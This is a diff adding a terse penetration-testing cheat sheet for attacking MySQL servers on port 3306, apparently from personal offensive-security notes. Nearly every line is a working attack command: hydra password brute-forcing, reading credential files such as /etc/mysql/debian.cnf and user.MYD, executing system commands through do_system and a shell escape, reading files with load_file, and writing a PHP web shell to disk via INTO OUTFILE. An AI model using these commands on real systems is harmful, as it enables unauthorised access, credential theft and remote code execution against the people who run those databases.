@@ -1,0 +1,34 @@
+# MYSQL - 3306
+# Brute force
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
+
+# Extracting MySQL credentials from files
+cat /etc/mysql/debian.cnf
+grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
+
+# Connect
+# Local
+mysql -u <USER>
+mysql -u <USER> -p
+
+# Remote
+mysql -h <IP> -u <USER>
+MySQL commands
+show databases;
+use <DATABASES>;
+
+show tables;
+describe <TABLE>;
+
+select * from <TABLE>;
+
+# Try to execute code
+select do_system('id');
+\! sh
+
+# Read & Write
+select load_file('<FILE>');
+select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
+
+# Manual exploit
+https://www.asafety.fr/mysql-injection-cheat-sheet/
